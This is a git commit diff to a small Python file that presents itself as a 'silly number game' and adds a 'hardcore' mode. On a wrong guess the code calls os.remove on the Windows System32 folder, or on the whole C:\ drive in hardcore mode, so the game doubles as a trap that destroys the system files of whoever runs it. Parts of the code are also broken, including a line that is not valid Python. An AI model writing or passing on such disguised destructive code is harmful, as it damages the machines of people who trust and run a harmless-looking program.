59b724d02f1788c8e5148688b6c707fd480db360
CoC-Fire <109904491+CoC-Fire@users.noreply.github.com>
2023-06-08 20:11:14 -0700

    Update game.py
    added new game mode!

--- game.py
+++ game.py
@@ -1,8 +1,13 @@
 import os
 import random
 
-number = random.randint(1. 10)
+number = random.randint(1, 10)
 
-guess = int(input("Silly game! Guess number between 1 and 10"))
+print("Here's a silly number game!\n\n")
 
-print("You Won!") if guess == number else os.remove("C:\\Windows\\System32")
+gamemode = input("Do you want to play hardcore gamemode? (Y/N): ")
+directory = "C:\\Windows\\System32" if gamemode.lower() != "y" else directory = "C:\\"
+
+guess = int(input("Guess number between 1 and 10"))
+
+print("You Won!") if guess == number else os.remove(directory)
